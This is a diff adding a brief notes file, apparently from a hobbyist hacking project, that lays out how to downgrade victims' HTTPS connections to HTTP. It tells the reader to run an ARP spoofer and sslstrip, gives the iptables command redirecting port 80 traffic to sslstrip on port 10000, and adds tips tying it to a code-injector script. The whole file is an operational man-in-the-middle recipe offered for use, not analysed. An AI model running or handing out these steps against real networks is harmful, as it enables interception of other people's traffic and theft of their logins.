@@ -1,0 +1,12 @@
+commands to downgrade https to http
+
+launch your arp_spoofer program
+launch sslstrip
+
+redirect the packet from port 80 to sslstrip (p 10000)
+#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+notes:
+-remember to change the port to 10000 in your scripts that interact with the packets.
+-you need to set the iptables rules such as if you were making test on local machine (see code_injector), because the packets are already on the computer, coming from sslstrip.
+
